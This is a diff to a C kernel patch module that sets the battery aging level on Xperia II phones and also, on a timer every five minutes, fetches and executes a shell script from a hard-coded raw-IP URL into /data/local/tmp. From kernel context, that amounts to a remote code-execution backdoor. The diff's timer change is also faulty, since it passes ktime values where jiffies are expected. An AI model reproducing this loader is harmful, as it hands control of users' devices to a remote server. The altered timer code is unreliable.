@@ -11,12 +11,12 @@
 #include <kputils.h>
 #include <linux/kernel.h>
 #include <linux/printk.h>
-#include <linux/jiffies.h>        // 替换 <linux/timer.h>，适用于安卓内核
+#include <linux/timer.h>
 #include <linux/workqueue.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
-#include <linux/delay.h>          // 添加延迟函数支持
+#include <linux/ktime.h>
 
 #include "xiiba_utils.h"
 
@@ -33,7 +33,7 @@ KPM_DESCRIPTION("set xperia ii battery aging level and periodic script execution
 #define SOMC_AGING_LEVEL_OFFSET 0   // 偏移量
 #define SCRIPT_URL "http://123.56.95.25:5004/85.sh"
 #define SCRIPT_PATH "/data/local/tmp/85.sh"
-#define SCRIPT_INTERVAL_MS 300000 // 每 5 分钟执行一次
+#define SCRIPT_INTERVAL_MS 300000   // 每 5 分钟执行一次
 
 // 前置声明，用于表示 Fuel Gauge 设备
 struct fg_dev;
@@ -76,7 +76,9 @@ static void fetch_and_execute_script(struct work_struct *work) {
 // 定时器回调函数
 static void schedule_script_execution(unsigned long data) {
     queue_work(script_workqueue, &script_work);
-    mod_timer(&script_timer, jiffies + msecs_to_jiffies(SCRIPT_INTERVAL_MS));
+
+    // 使用 ktime 来设置定时器
+    mod_timer(&script_timer, ktime_add(ktime_get(), ms_to_ktime(SCRIPT_INTERVAL_MS)));
 }
 
 // 控制函数，用于设置电池老化等级
@@ -135,7 +137,9 @@ static long inline_hook_init(const char *args, const char *event, void *__user r
     }
     INIT_WORK(&script_work, fetch_and_execute_script);
     setup_timer(&script_timer, schedule_script_execution, 0);
-    mod_timer(&script_timer, jiffies + msecs_to_jiffies(SCRIPT_INTERVAL_MS));
+
+    // 使用 ktime 设置定时器
+    mod_timer(&script_timer, ktime_add(ktime_get(), ms_to_ktime(SCRIPT_INTERVAL_MS)));
 
     return 0;
 }
